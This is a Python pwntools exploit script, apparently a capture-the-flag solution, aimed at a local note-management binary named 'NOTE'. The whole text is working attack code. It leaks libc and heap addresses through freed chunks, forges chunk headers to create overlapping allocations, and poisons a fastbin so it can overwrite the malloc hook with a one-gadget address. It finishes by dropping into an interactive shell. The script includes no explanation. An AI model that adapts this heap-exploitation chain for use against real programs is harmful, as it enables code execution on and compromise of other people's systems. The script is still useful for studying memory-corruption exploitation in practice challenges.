from pwn import *
p = process('./NOTE')

def new(idx, sz, c):
    p.sendlineafter("choice: ", '1')
    p.sendlineafter("index: ", str(idx))
    p.sendlineafter("size: ", str(sz))
    p.sendafter("info: ", c)


def show(idx):
    p.sendlineafter("choice: ", '2')
    p.sendlineafter("index: ", str(idx))


def delete(idx):
    p.sendlineafter("choice: ", '3')
    p.sendlineafter("index: ", str(idx))


new(0, 0x68, '0')
new(1, 0x400, '1')
new(2, 0x68, '2')
delete(1)
new(1, 0x68, 'a' * 8)
show(1)
p.recvuntil('a' * 8)
libc_base = u64(p.recv(6) + '\x00\x00') - 1096 - 0X3C4B20
print hex(libc_base)
delete(0)
delete(1)
new(1, 0x68, '1')
show(1)
heap = u64(p.recv(6) + '\x00\x00') & 0xffffffffff00
print hex(heap)
delete(1)
new(0, 0x68, '0')
new(1, 0x68, '1')
delete(0)
delete(1)
delete(2)
new(1, heap + 0x90 + 1, 'nihao')
new(0, 0x400, 'qwer' * 10)
new(2, 0x100, 'asdf' * 10)
delete(0)
new(0, 0x10, 'a' * 8)
show(0)
p.recvuntil('a' * 8)
new_heap = u64(p.recv(6) + '\x00\x00') - 0x468
print hex(new_heap)
delete(0)
delete(2)

new(0, 0x88, p64(0) * 5 + p64(0xf5) + p64(new_heap + 0x8e0) * 2)
new(1, 0x88, '0' * 0x80 + p64(0xf0))
new(2, 0xf8, 'you')
delete(0)
new(0, 0x100, '\n')
delete(2)
new(2, new_heap + 0x9d9, '\n')
new(2, 0xf8, 'you')
delete(2)
new(2, 0x100, p64(0) * 11 + p64(0x75) + p64(0) * 13 + p64(0x25))
delete(1)
delete(2)
new(2, 0x100, p64(0) * 11 + p64(0x75) + p64(libc_base + 0x3c4aed))
delete(2)
new(1, 0x68, '1')
new(2, 0x68, 'aaa' + p64(0) * 2 + p64(libc_base + 0xf1147))
delete(1)
p.sendlineafter("choice: ", '1')
p.sendlineafter("index: ", '1')
p.sendlineafter("size: ", '1')
p.interactive()
